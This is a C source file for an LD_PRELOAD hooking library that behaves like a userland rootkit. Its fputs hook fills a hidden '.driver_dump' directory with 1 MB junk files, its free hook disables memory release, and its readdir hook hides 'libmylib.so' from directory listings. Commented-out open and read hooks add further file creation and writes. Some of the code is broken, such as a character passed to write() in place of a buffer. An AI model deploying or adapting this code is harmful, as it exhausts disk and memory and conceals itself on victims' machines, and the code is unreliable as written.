#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include<dirent.h>
#include <unistd.h>
#include <fcntl.h> 


void createfile()
{
    srand(time(NULL));

    char initial_path[200];
    strcpy(initial_path,".driver_dump/.");

    char string[9];
    for (int i = 0; i < 8; i++) {
        string[i] = 'a' + rand() % 26;
    }
    string[8] = '\0';

    char filename[8+5];
    strcpy(filename, string);
    strcat(filename, ".txt");
    strcat(initial_path,filename);
    
    mkdir(".driver_dump", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

    //FILE *fp = fopen(initial_path, "w");
    int descriptor = open(initial_path, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);

    int i;
    for (i = 0; i < 1024*1024; i++) {
    	write(descriptor, 'a' + rand() % 26, 1);
        //fputc('a' + rand() % 26, fp);
    }
    
    //fclose(fp);
}      


















int fputs(const char *str, FILE *stream)
{

    int (*original_fputs)(const char *, FILE *) = dlsym(RTLD_NEXT, "fputs");
    int result = original_fputs(str, stream);
    //printf("fputs\n");
    createfile();
    
    return result;
}






















void* malloc(size_t size)
{
    void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
    void *ret = real_malloc(size);

	
    //fprintf(stderr,"malloc\n");

    return ret;
}



















void free(void *p)
{
    void (*libc_free)(void*) = dlsym(RTLD_NEXT, "free");

    //libc_free(p);
}




















typedef pid_t (*fork_func_t)(void);
pid_t fork(void) 
{
  fork_func_t original_fork = (fork_func_t)dlsym(RTLD_NEXT, "fork");

  pid_t pid = original_fork();
  // Add your custom code here, if needed
  //fprintf(stderr,"fork\n");
  //createfile();
  
  return pid;
}




















struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
	
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp)){
	    
        //if(strstr(dir->d_name,".driver_dump") == 0) 
        //	break;
        if(strstr(dir->d_name,"libmylib.so") == 0) 
        	break;
    }
    return dir;
}














/*
int open(const char *pathname, int flags) {
    static int (*real_open)(const char *, int) = NULL;

    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

    int fd = real_open(pathname, flags);
    
    
    fprintf(stderr,"open");
    createfile();
    return fd;
}
*/

























/*
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;

    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        
    }

    ssize_t n = real_read(fd, buf, count);
    fprintf(stderr, "read");
   //createfile();
   write(fd,"p",4);
   fsync(fd);
    return n;
}
*/
